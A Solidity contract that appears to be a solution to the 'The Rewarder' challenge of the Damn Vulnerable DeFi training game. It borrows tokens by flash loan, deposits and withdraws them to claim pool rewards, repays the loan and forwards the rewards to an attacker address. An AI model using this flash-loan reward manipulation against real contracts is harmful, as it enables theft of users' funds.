// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";

/**
 * @title Attack Contract for The Rewarder
 */
contract AttackTheRewarder {
    using Address for address;

    TheRewarderPool public immutable rewardPool;
    DamnValuableToken public immutable dvt;
    RewardToken public immutable rewardToken;
    FlashLoanerPool public immutable flashPool;
    address public immutable attacker;

    constructor(
        address rewardPoolAddr,
        address dvtAddr,
        address rewardTokenAddr,
        address flashPoolAddr,
        address attackerAddr
    ) {
        rewardPool = TheRewarderPool(rewardPoolAddr);
        dvt = DamnValuableToken(dvtAddr);
        rewardToken = RewardToken(rewardTokenAddr);
        flashPool = FlashLoanerPool(flashPoolAddr);
        attacker = attackerAddr;
    }

    function receiveFlashLoan(uint256 amount) external {
        dvt.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);
        dvt.transfer(address(flashPool), amount);
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
    }

    function flashLoan(uint256 amount) external {
        flashPool.flashLoan(amount);
    }
}
